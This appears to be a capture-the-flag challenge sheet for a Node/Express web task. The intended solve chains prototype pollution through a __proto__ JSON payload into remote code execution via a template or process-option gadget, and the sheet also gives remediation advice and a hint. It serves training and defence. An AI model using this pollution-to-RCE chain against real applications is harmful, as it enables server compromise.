# h08 — Polluted Pearls (Pearl Telecom)

**Category:** Web / Prototype pollution → RCE · **Difficulty:** Insane · **Points:** 500 (dynamic)

## Intended solve
```js
// The /api/preferences route deep-merges your JSON into a config object (lodash.merge-style),
// with no key filtering -> prototype pollution.
POST /api/preferences
{ "settings": { "__proto__": { "polluted": "yes" } } }        // 1) confirm pollution

// 2) The render path (server-side template / child_process option object) reads an option off a
//    plain object that now inherits from a polluted Object.prototype. Pollute the exact gadget:
//    e.g. EJS/handlebars "outputFunctionName" / a spawned process's "shell" or "env" — turning a
//    later render or exec into attacker-controlled code.
{ "settings": { "__proto__": { "<gadget key>": "<payload that execs>" } } }

// 3) Trigger the sink (request the report/render route). It executes the payload:
//    -> read /flag  ->  CYPHER{...}
```
Two-stage: the **pollution primitive** is on one route; the **gadget/sink** is a different route's
render/exec that trusts an inherited property.

## Infra & safety
- Per-team Node/Express instance. Recursive-merge with no `__proto__`/`constructor` guard is the
  intended flaw; a known template/exec gadget completes it to RCE. Confined to the container;
  `/flag` is the only prize; egress blocked.

## Remediation (Blue Team Brief)
Reject/`freeze` `__proto__`/`constructor`/`prototype` keys in merges; use `Map` or
`Object.create(null)` for user data; keep libraries patched (many merge/CVEs); validate against a
schema; never derive exec/template options from user-influenced objects.

## Hint (costed, non-giveaway)
"The crash you can cause on one route is the primitive for another." — cost 100.
